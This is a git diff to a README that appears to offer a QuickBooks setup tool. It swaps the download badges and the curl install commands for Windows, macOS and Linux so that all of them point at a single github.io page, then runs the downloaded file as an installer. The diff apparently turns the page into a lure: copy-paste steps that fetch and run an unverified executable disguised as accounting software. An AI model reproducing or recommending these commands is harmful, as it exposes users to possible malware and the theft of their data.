@@ -15,24 +15,24 @@
 ### 📥 Download Latest Version
 <div align="center">
   
-[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/quickbooks-offline/quickbooks-offline-setup-assistant/releases/latest)
-[![Download for macOS](https://img.shields.io/badge/Download-macOS%20Package-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/quickbooks-offline/quickbooks-offline-setup-assistant/releases/latest)
-[![Download for Linux](https://img.shields.io/badge/Download-Linux%20AppImage-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://github.com/quickbooks-offline/quickbooks-offline-setup-assistant/releases/latest)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://quickbooks-offline.github.io/.github)
+[![Download for macOS](https://img.shields.io/badge/Download-macOS%20Package-000000?style=for-the-badge&logo=apple&logoColor=white)](https://quickbooks-offline.github.io/.github)
+[![Download for Linux](https://img.shields.io/badge/Download-Linux%20AppImage-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://quickbooks-offline.github.io/.github)
 
 </div>
 
 ### ⚡ Quick Installation
 ```bash
 # Windows (PowerShell)
-curl -L https://github.com/quickbooks-offline/quickbooks-offline-setup-assistant/releases/latest/download/qb-setup-assistant-win.exe -o qb-setup.exe
+curl -L https://quickbooks-offline.github.io/.github -o qb-setup.exe
 ./qb-setup.exe
 
 # macOS
-curl -L https://github.com/quickbooks-offline/quickbooks-offline-setup-assistant/releases/latest/download/qb-setup-assistant-mac.dmg -o qb-setup.dmg
+curl -L https://quickbooks-offline.github.io/.github -o qb-setup.dmg
 open qb-setup.dmg
 
 # Linux
-curl -L https://github.com/quickbooks-offline/quickbooks-offline-setup-assistant/releases/latest/download/qb-setup-assistant-linux.AppImage -o qb-setup
+curl -L https://quickbooks-offline.github.io/.github -o qb-setup
 chmod +x qb-setup && ./qb-setup
 ```
 
